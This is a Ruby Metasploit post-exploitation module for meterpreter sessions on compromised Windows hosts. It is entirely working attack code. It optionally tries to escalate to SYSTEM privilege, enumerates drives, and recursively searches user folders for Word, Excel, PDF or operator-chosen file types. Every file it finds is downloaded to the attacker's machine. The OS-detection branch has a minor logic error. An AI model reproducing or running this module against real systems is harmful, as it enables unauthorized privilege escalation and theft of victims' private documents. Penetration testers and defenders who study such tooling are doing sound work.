require 'msf/core'
require 'msf/core/post/file'
class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Find Interesting Docs',
			'Description'   => %q{ This POST module attempts to find interesting files from user directories etc. },
			'License'       => MSF_LICENSE,
			'Author'        => [ 'David Hardy <davehardy20@gmail.com>' ],
			'Version'       => '$Revision: 1.2 $',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new(  'GETWORD',	[ false, 'Search and download all Word files, doc, docx', false]),
				OptBool.new(  'GETEXCEL',	[ false, 'Search and download all Excel files, xls, xlsx', false]),
				OptBool.new(  'GETPDF',		[ false, 'Search and download all .pdf files.', false]),
				OptBool.new(  'ENUM_DRIVES',[ false, 'Enumerate drives and display drive letters.', false]),
				OptString.new(  'SEARCH_DRIVE',	[ false, 'Search in a specified Drive. Ex. D:\, Run ENUM_DRIVES first.']),
				OptString.new(  'FILE_TYPE',	[ false, 'Search for a file type based on extension. eg *.ini']),
				OptString.new(	'DUMP_LOC',		[ false, 'Folder to DUMP downloaded files. eg /tmp/Docs/, if not set, /tmp will be used.']),
				OptBool.new(  'GET_SYS',	[ false, 'Attempt to Get_System, in case of Low privilige user.', false])
			], self.class)
	end



#Mubix
	def get_drives
		a = client.railgun.kernel32.GetLogicalDrives()["return"]
		drives = []
		letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		(0..25).each do |i|
			test = letters[i,1]
			rem = a % (2**(i+1))
				if rem > 0
				drives << test
				a = a - rem
				end
			end
			print_status("Drives Available = #{drives.inspect}")
	end
			
	def download_word_files
		location = datastore['SEARCH_DRIVE']
        target = client.sys.config.sysinfo["Computer"]
		file_type = "*.doc*"
		if datastore['DUMP_LOC']
			dump = datastore['DUMP_LOC']
		else dump = "/tmp"
		end
        dump = dump + target
        print_status("")
		print_status("\tSearching for and downloading Word documents...")
		print_status("")
		if datastore['SEARCH_DRIVE']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		else getfile = client.fs.file.search($userfolders,file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Found #{file['path']}\\#{file['name']}...Saving in - #{dump}")
			client.fs.file.download(dump, "#{file['path']}\\#{file['name']}")
		end
	end

	def download_excel_files
		location = datastore['SEARCH_DRIVE']
        target = client.sys.config.sysinfo["Computer"]
		file_type = "*.xls*"
		if datastore['DUMP_LOC']
			dump = datastore['DUMP_LOC']
			else dump = "/tmp"
		end
        dump = dump + target
        print_status("")
		print_status("\tSearching for and downloading Excel documents...")
		print_status("")
		if datastore['SEARCH_DRIVE']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		else getfile = client.fs.file.search($userfolders,file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Found #{file['path']}\\#{file['name']}...Saving in - #{dump}")
			client.fs.file.download(dump, "#{file['path']}\\#{file['name']}")
		end
	end

	def download_pdf_files
		location = datastore['SEARCH_DRIVE']
        target = client.sys.config.sysinfo["Computer"]
		file_type = "*.pdf"
		if datastore['DUMP_LOC']
			dump = datastore['DUMP_LOC']
			else dump = "/tmp"
		end
        dump = dump + target
        print_status("")
		print_status("\tSearching for and downloading Pdf documents...")
		print_status("")
		if datastore['SEARCH_DRIVE']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		else getfile = client.fs.file.search($userfolders,file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Found #{file['path']}\\#{file['name']}...Saving in - #{dump}")
			client.fs.file.download(dump, "#{file['path']}\\#{file['name']}")
		end
	end

	def download_specific_files
		location = datastore['SEARCH_DRIVE']
        target = client.sys.config.sysinfo["Computer"]
		file_type = datastore['FILE_TYPE']
		if datastore['DUMP_LOC']
			dump = datastore['DUMP_LOC']
			else dump = "/tmp"
		end
        dump = dump + target
        print_status("")
		print_status("\tSearching for and downloading User Specified files...")
		print_status("")
		if datastore['SEARCH_DRIVE']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		else getfile = client.fs.file.search($userfolders,file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Found #{file['path']}\\#{file['name']}...Saving in - #{dump}")
			client.fs.file.download(dump, "#{file['path']}\\#{file['name']}")
		end
	end

	def run
		begin
		
		#darkoperator - Attempt to GET_SYS
			if datastore['GET_SYS']
				print_status("Trying to get SYSTEM privilege")
				get_sys = session.priv.getsystem
				if get_sys[0]
					print_good("Got SYSTEM privilege")
					else
					print_error("Could not obtain SYSTEM privileges")
				end
			end
        #Workout System Type
            sys_type = client.sys.config.sysinfo['OS']
            sys_drv = client.fs.file.expand_path("%SYSTEMDRIVE%")
            if sys_type =~/Windows XP|2003|.NET/
                $userfolders = sys_drv + "\\Documents and Settings\\"
            else sys_type =~/Windows 7|Windows Vista|2008/
                $userfolders = sys_drv + "\\Users\\"
            end
            
			if datastore['ENUM_DRIVES']
				get_drives
			end
			if datastore['GETWORD']
				download_word_files
			end

			if datastore['GETEXCEL']
				download_excel_files
			end

			if datastore['GETPDF']
				download_pdf_files
			end
			if datastore['FILE_TYPE']
				download_specific_files
			end
			print_status("Search Complete")
		end
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end
